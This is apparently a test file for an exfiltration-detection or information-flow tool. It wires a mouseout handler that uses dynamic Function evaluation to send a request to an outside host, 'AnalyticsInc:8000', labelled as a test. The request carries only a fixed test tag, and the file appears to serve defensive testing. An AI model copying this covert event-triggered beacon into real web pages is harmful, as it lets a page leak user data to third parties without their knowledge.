// exfil_test_onmouseout2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmouseout2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("mouseout", JAM.call(Function, null, [exp]), false)
